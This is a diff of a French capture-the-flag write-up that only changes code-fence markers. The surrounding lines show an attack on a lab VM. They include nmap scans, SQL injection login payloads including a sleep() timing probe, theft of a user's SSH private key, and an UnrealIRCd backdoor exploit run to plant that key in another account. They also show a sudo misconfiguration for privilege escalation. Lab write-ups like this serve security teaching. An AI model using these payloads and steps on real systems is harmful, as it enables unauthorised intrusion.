@@ -56,13 +56,13 @@ Vous pouvez soit faire un *"arp -a"* et retrouver l'adresse MAC dans la liste ou
 
 Vous pouvez aussi lancer un PING scan avec *NMap* qui nous donnera l'adresse IP et l'adresse MAC de chaque machine présente sur le réseau :
 
-```plain
+```
 nmap -sn 192.168.1.0/24
 ```
 
 parmi les lignes obtenues je retrouve l'adresse MAC de la VM :
 
-```plain
+```
 Nmap scan report for 192.168.1.57
 Host is up (0.00016s latency).
 MAC Address: 08:00:27:D5:72:05 (Cadmus Computer Systems)
@@ -70,7 +70,7 @@ MAC Address: 08:00:27:D5:72:05 (Cadmus Computer Systems)
 
 Maintenant on peut lancer un scan de port de notre future victime (référez-vous au manuel de *NMap* pour la signification des options) :)
 
-```plain
+```
 nmap -A 192.168.1.57
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-03 19:07 CET
@@ -123,7 +123,7 @@ Si on tente de fermer la requête SQL sous-jacente en saisissant le login root'
 
 En revanche si on ne ferme pas la connexion mais qu'on l'agrémente d'une condition supplémentaire avec le nom d'utilisateur suivant :
 
-```plain
+```
 root'/**/or/**/'1'='1
 ```
 
@@ -134,7 +134,7 @@ En remplaçant le '1' par un mot clé MySQL comme USER() ou VERSION() pas plus
 Si on indique la colonne 'passwd' pas de fermeture non plus. On pourrait donc assez facilement brute-forcer le nom des colonnes.
 Il est aussi possible de provoquer des timeouts en injectant un sleep() avec le nom d'utilisateur suivant :
 
-```plain
+```
 root'/**/or/**/sleep(15)='1
 ```
 
@@ -176,7 +176,7 @@ print "done"
 
 Résultat obtenu :
 
-```plain
+```
 Failed union with 1 columns
 Failed union with 2 columns
 Failed union with 3 columns
@@ -244,7 +244,7 @@ On s’aperçoit assez vite que *wget* n'est pas installé et que *curl* a ét
 Via un *ls -alR /home* on découvre deux utilisateur : *jetta* et *mauk*.
 Le second a été quelque peu permissif sur les droits d'accès de ses fichiers puisqu'il est possible de lire ses clés SSH !
 
-```plain
+```
 /home:
 total 16
 drwxr-xr-x.  4 root  root  4096 Feb 25  2013 .
@@ -273,7 +273,7 @@ drwxr-xr-x. 3 mauk mauk 4096 Jul  9  2013 ..
 
 On affiche le contenu de *id\_rsa* que l'on écrit dans un fichier *mauk\_key* en local puis on se connecte via SSH sur notre cible :
 
-```plain
+```
 ssh -i mauk_key mauk@192.168.1.57
 ```
 
@@ -297,7 +297,7 @@ Pour rendre le serveur IRC accessible depuis l'extérieur, on va mettre en plac
 
 D'abord en local je lance [un serveur HTTP minimaliste python-powered](http://docs.python.org/2/library/simplehttpserver.html) en étant dans le même dossier que *KevProxy.c* :
 
-```plain
+```
 python -m SimpleHTTPServer 8000
 ```
 
@@ -317,7 +317,7 @@ On remarque que le serveur est en version 3.2.8.1. Il s'agit ni plus ni moins [d
 
 Mon dévolu s'est porté sur l'exploit en version Python. Le principe de la backdoor consiste à envoyer une commande de la sorte au serveur :  
 
-```plain
+```
 AB;ls;
 ```
 
@@ -325,14 +325,14 @@ Ainsi la commande *ls* sera exécutée. Il faut modifier quelque peu l'exploit
 
 On va utiliser le fait qu'on dispose déjà d'une clé SSH connue sur le système pour nous ouvrir les portes de l'utilisateur *jetta* :
 
-```plain
+```
 python 40820.py 192.168.1.57 9999 "mkdir -p /home/jetta/.ssh"
 python 40820.py 192.168.1.57 9999 "cat /home/mauk/.ssh/id_rsa.pub >> /home/jetta/.ssh/authorized_keys"
 ```
 
 puis on se connecte :
 
-```plain
+```
 ssh -i mauk_key jetta@192.168.1.57
 ```
 
@@ -343,14 +343,14 @@ On remarque que dans son *home* l'utilisateur dispose d'un dossier *auth\_server
 
 Dans ce dossier on trouve un autre binaire du même nom. Le programme n'est pas setuid root mais quand on appelle *sudo -l* on obtient :
 
-```plain
+```
 User jetta may run the following commands on this host:
     (root) NOPASSWD: /home/jetta/auth_server/auth_server
 ```
 
 Donc si on fait *sudo auth\_server* le programme sera lancé comme si on était root. Par curiosité on lance un *strings* dessus et on remarque dans la vingtaine de lignes :
 
-```plain
+```
 could not establish connection
 invalid certificates
 error: (12)
